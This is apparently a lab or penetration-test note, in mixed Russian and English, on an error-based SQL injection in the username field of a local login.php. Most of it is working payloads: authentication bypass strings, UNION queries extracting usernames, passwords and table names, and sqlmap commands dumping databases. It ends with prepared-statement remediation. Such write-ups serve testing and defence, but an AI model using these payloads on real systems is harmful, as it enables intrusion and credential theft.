# SQL Injection — Working Exploits

## Уязвимость

**Location:** `/login.php`  
**Parameter:** `username`  
**Type:** Error-based SQL Injection

---

## Working Payloads

### 1. Authentication Bypass

```sql
' OR '1'='1
' OR 1=1--
admin' --
admin' #
```

**Результат:** Login без правильного пароля

### 2. UNION-based (если работает)

```sql
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
```

**Цель:** Найти количество columns

### 3. Data Extraction

```sql
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, null FROM information_schema.tables--
```

**Результат:** Извлечение данных из БД

### 4. sqlmap (automated)

```bash
# Basic scan
sqlmap -u "http://localhost:8080/login.php" \
  --data="username=test&password=test" \
  --batch

# Extract databases
sqlmap -u "http://localhost:8080/login.php" \
  --data="username=test&password=test" \
  --dbs --batch

# Dump tables (if DB found)
sqlmap -u "http://localhost:8080/login.php" \
  --data="username=test&password=test" \
  -D database_name --tables --batch
```

---

## Impact

- **Authentication bypass:** Full admin access
- **Data extraction:** All user credentials
- **Potential:** RCE via `INTO OUTFILE` (если permissions)

---

## Remediation

```php
// Уязвимый код
$query = "SELECT * FROM users WHERE username='$username'";

// Безопасный код (Prepared Statements)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

**Additional:**
- Input validation
- WAF (Web Application Firewall)
- Least privilege DB user
- Escape special chars (но prepared statements лучше!)
